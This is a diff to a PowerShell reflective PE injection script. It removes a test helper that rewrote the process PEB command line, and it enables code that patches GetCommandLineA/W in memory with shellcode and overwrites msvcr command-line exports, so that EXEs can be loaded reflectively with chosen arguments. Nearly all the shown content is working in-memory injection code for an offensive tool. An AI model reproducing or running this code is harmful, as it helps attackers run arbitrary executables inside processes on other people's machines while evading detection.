@@ -214,7 +214,6 @@ $RemoteScriptBlock = {
 	Function Get-Win32Types
 	{
 		$Win32Types = New-Object System.Object
-		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
 
 		#Define all the structures/enums that will be used
 		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
@@ -535,59 +534,6 @@ $RemoteScriptBlock = {
 		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
 		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
-		
-		#Struct UNICODE_STRING
-		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-		$TypeBuilder = $ModuleBuilder.DefineType('UNICODE_STRING', $Attributes, [System.ValueType], 4 + $PtrSize)
-		$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
-		$TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
-		$UNICODE_STRING = $TypeBuilder.CreateType()
-		$Win32Types | Add-Member -MemberType NoteProperty -Name UNICODE_STRING -Value $UNICODE_STRING
-		
-		#Struct Partial_RTL_USER_PROCESS_PARAMETERS
-		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-		$TypeBuilder = $ModuleBuilder.DefineType('Partial_RTL_USER_PROCESS_PARAMETERS', $Attributes, [System.ValueType], (5*4) + (5 * $PtrSize) + (4* (4+$PtrSize)))
-		$TypeBuilder.DefineField('Dummy1', [UInt32], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy2', [UInt32], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy3', [UInt32], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy4', [UInt32], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy5', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy6', [UInt32], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy7', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy8', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy9', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy10', $UNICODE_STRING, 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy11', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Dummy12', $UNICODE_STRING, 'Public') | Out-Null
-		$TypeBuilder.DefineField('ImagePathName', $UNICODE_STRING, 'Public') | Out-Null
-		$TypeBuilder.DefineField('CommandLine', $UNICODE_STRING, 'Public') | Out-Null
-		$Partial_RTL_USER_PROCESS_PARAMETERS = $TypeBuilder.CreateType()
-		$Win32Types | Add-Member -MemberType NoteProperty -Name Partial_RTL_USER_PROCESS_PARAMETERS -Value $Partial_RTL_USER_PROCESS_PARAMETERS
-		
-		#Struct Partial_PEB       <-- I only need the PEB to modify the process parameters for EXE loading, not going to bother defining the whole struct
-		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-		$TypeBuilder = $ModuleBuilder.DefineType('Partial_PEB', $Attributes, [System.ValueType], 4 + (3 * $PtrSize))
-		$TypeBuilder.DefineField('ReservedStuffIDontNeed', [UInt32], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Reserved3_1', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Reserved3_2', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Ldr', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('ProcessParameters', [IntPtr], 'Public') | Out-Null
-		$Partial_PEB = $TypeBuilder.CreateType()
-		$Win32Types | Add-Member -MemberType NoteProperty -Name Partial_PEB -Value $Partial_PEB
-		
-		#Struct PROCESS_BASIC_INFORMATION
-		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-		$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_BASIC_INFORMATION', $Attributes, [System.ValueType], 6 * $PtrSize)
-		$TypeBuilder.DefineField('Reserved1', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('PebBaseAddress', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Reserved2_1', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Reserved2_2', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('UniqueProcessId', [IntPtr], 'Public') | Out-Null
-		$TypeBuilder.DefineField('Reserved3', [IntPtr], 'Public') | Out-Null
-		$PROCESS_BASIC_INFORMATION = $TypeBuilder.CreateType()
-		$Win32Types | Add-Member -MemberType NoteProperty -Name PROCESS_BASIC_INFORMATION -Value $PROCESS_BASIC_INFORMATION
-		
 
 		return $Win32Types
 	}
@@ -762,16 +708,6 @@ $RemoteScriptBlock = {
         $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
         $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
-		
-		$GetCurrentProcessAddr = Get-ProcAddress Kernel32.dll GetCurrentProcess
-        $GetCurrentProcessDelegate = Get-DelegateType @() ([IntPtr])
-        $GetCurrentProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentProcessAddr, $GetCurrentProcessDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentProcess -Value $GetCurrentProcess
-		
-		$NtQueryInformationProcessAddr = Get-ProcAddress NtDll.dll NtQueryInformationProcess
-        $NtQueryInformationProcessDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([UInt32])
-        $NtQueryInformationProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtQueryInformationProcessAddr, $NtQueryInformationProcessDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtQueryInformationProcess -Value $NtQueryInformationProcess
 		
 		return $Win32Functions
 	}
@@ -1977,63 +1913,6 @@ $RemoteScriptBlock = {
 		}
 	}
 	
-	
-	Function Update-ExeArguments
-	{
-		Param(
-		[Parameter(Position = 1, Mandatory = $true)]
-		[String]
-		$ExeArguments,
-		
-		[Parameter(Position = 2, Mandatory = $true)]
-		[System.Object]
-		$Win32Functions,
-		
-		[Parameter(Position = 3, Mandatory = $true)]
-		[System.Object]
-		$Win32Constants,
-		
-		[Parameter(Position = 4, Mandatory = $true)]
-		[System.Object]
-		$Win32Types
-		)
-		
-		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
-		
-		[IntPtr]$PSProcHandle = $Win32Functions.GetCurrentProcess.Invoke()
-		
-		#Create space for PROCESS_BASIC_INFORMATION
-		[UInt32]$ProcBasicInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.PROCESS_BASIC_INFORMATION)
-		$ProcBasicInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcBasicInfoSize)
-		
-		[UInt32]$Size = 0
-		$RetVal = $Win32Functions.NtQueryInformationProcess.Invoke($PSProcHandle, 0, $ProcBasicInfoPtr, $ProcBasicInfoSize, [Ref]$Size)
-		
-		if (($RetVal -ne 0) -or ($Size -lt $ProcBasicInfoSize))
-		{
-			Throw "Error calling NtQueryInformationProcess"
-		}
-		
-		#Get PEB commandline argument structure
-		$ProcBasicInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcBasicInfoPtr, $Win32Types.PROCESS_BASIC_INFORMATION)
-		$PEB = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcBasicInfo.PebBaseAddress, $Win32Types.Partial_PEB)
-		$ProcessParameters = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEB.ProcessParameters, $Win32Types.Partial_RTL_USER_PROCESS_PARAMETERS)
-		$OriginalCommandLine = $ProcessParameters.CommandLine
-		
-		#Update PEB
-		[IntPtr]$CommandLineBaseAddr = Add-SignedIntAsUnsigned $PEB.ProcessParameters ((5 * 4) + (5 * $PtrSize) + (3 * (4 + $PtrSize)) + 20) #todo 20 is for 64bit, need 32bit
-		$ArgStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-		
-		[System.Runtime.InteropServices.Marshal]::WriteInt16($CommandLineBaseAddr, 0, $ExeArguments.Length + 1) #Length
-		[System.Runtime.InteropServices.Marshal]::WriteInt16($CommandLineBaseAddr, 2, $ExeArguments.Length + 1) #MaximumLength
-		[System.Runtime.InteropServices.Marshal]::WriteIntPtr($CommandLineBaseAddr, 4, $ArgStr) #String pointer
-
-		#$ProcessParameters = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEB.ProcessParameters, $Win32Types.Partial_RTL_USER_PROCESS_PARAMETERS)
-		
-		#return $OriginalCommandLine #todo return this
-	}
-	
-	
 	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
 	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
 	Function Update-ExeFunctions
@@ -2078,128 +1957,128 @@ $RemoteScriptBlock = {
 			throw "KernelBase handle null"
 		}
 
-#		#################################################
-#		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
-#		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
-#		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-#		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
-#	
-#		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
-#		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")
-#
-#		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
-#		{
-#			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
-#		}
-#
-#		#Prepare the shellcode
-#		[Byte[]]$Shellcode1 = @()
-#		if ($PtrSize -eq 8)
-#		{
-#			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
-#		}
-#		$Shellcode1 += 0xb8
-#		
-#		[Byte[]]$Shellcode2 = @(0xc3)
-#		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
-#		
-#		
-#		#Make copy of GetCommandLineA and GetCommandLineW
-#		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
-#		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
-#		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
-#		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
-#		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
-#		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
-#
-#		#Overwrite GetCommandLineA
-#		[UInt32]$OldProtectFlag = 0
-#		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
-#		if ($Success = $false)
-#		{
-#			throw "Call to VirtualProtect failed"
-#		}
-#		
-#		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
-#		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
-#		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
-#		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
-#		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
-#		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
-#		
-#		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
-#		
-#		
-#		#Overwrite GetCommandLineW
-#		[UInt32]$OldProtectFlag = 0
-#		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
-#		if ($Success = $false)
-#		{
-#			throw "Call to VirtualProtect failed"
-#		}
-#		
-#		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
-#		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
-#		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
-#		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
-#		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
-#		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
-#		
-#		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
-#		#################################################
-#		
-#		
-#		#################################################
-#		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
-#		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
-#		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
-#		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
-#		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
-#			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
-#		
-#		foreach ($Dll in $DllList)
-#		{
-#			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
-#			if ($DllHandle -ne [IntPtr]::Zero)
-#			{
-#				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
-#				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
-#				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
-#				{
-#					"Error, couldn't find _wcmdln or _acmdln"
-#				}
-#				
-#				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
-#				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-#				
-#				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
-#				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [IntPtr])
-#				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [IntPtr])
-#				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-#				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
-#				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
-#				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
-#				
-#				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
-#				if ($Success = $false)
-#				{
-#					throw "Call to VirtualProtect failed"
-#				}
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
-#				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
-#				
-#				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
-#				if ($Success = $false)
-#				{
-#					throw "Call to VirtualProtect failed"
-#				}
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
-#				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
-#			}
-#		}
-#		#################################################
+		#################################################
+		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
+		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
+		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
+		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
+	
+		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
+		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")
+
+		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
+		{
+			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
+		}
+
+		#Prepare the shellcode
+		[Byte[]]$Shellcode1 = @()
+		if ($PtrSize -eq 8)
+		{
+			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
+		}
+		$Shellcode1 += 0xb8
+		
+		[Byte[]]$Shellcode2 = @(0xc3)
+		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
+		
+		
+		#Make copy of GetCommandLineA and GetCommandLineW
+		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
+		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
+		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
+		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
+		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
+		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
+
+		#Overwrite GetCommandLineA
+		[UInt32]$OldProtectFlag = 0
+		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		if ($Success = $false)
+		{
+			throw "Call to VirtualProtect failed"
+		}
+		
+		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
+		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
+		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
+		
+		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		
+		
+		#Overwrite GetCommandLineW
+		[UInt32]$OldProtectFlag = 0
+		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		if ($Success = $false)
+		{
+			throw "Call to VirtualProtect failed"
+		}
+		
+		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
+		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
+		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
+		
+		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		#################################################
+		
+		
+		#################################################
+		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
+		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
+		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
+		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
+		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
+			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
+		
+		foreach ($Dll in $DllList)
+		{
+			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
+			if ($DllHandle -ne [IntPtr]::Zero)
+			{
+				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
+				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
+				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
+				{
+					"Error, couldn't find _wcmdln or _acmdln"
+				}
+				
+				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
+				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
+				
+				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
+				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [IntPtr])
+				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [IntPtr])
+				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
+				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
+				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
+				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
+				
+				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				if ($Success = $false)
+				{
+					throw "Call to VirtualProtect failed"
+				}
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
+				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+				
+				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				if ($Success = $false)
+				{
+					throw "Call to VirtualProtect failed"
+				}
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
+				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+			}
+		}
+		#################################################
 		
 		
 		#################################################
@@ -2730,10 +2609,6 @@ $RemoteScriptBlock = {
 		$Win32Types = Get-Win32Types
 		$Win32Constants =  Get-Win32Constants
 		
-		#todo delete for testing
-		Update-ExeArguments -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -ExeArguments "custom test 1 2 3"
-		#Read-Host "stopping"
-		
 		$RemoteProcHandle = [IntPtr]::Zero
 	
 		#If a remote process to inject in to is specified, get a handle to it
@@ -2892,7 +2767,7 @@ $RemoteScriptBlock = {
 
 #Main function to either run the script locally or remotely
 Function Main
-{	
+{
 	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
 	{
 		$DebugPreference  = "Continue"
